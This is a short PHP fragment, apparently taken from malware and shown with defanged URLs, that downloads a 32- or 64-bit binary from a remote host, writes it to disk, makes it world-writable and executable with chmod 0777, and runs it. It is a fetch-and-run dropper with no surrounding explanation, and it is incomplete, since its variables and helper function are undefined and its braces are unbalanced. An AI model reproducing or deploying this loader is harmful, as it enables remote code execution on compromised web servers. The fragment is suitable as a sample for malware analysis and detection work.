<?php
$x="";
if ($is64) {
        $x=@file_get_contents("hxxp://xfer.abcxyz[.]stream/64");
} else {
        $x=@file_get_contents("hxxp://xfer.abcxyz[.]stream/32");
}
if ((strlen($x)>0) and (file_put_contents("./".$file,$x)!=false)) {
        if (chmod("./".$file,0777)) {
                r("./{$file} {$e}");
        } else {
                r("chmod 0777 {$file}");
                r("./{$file} {$e}");
        }
?>
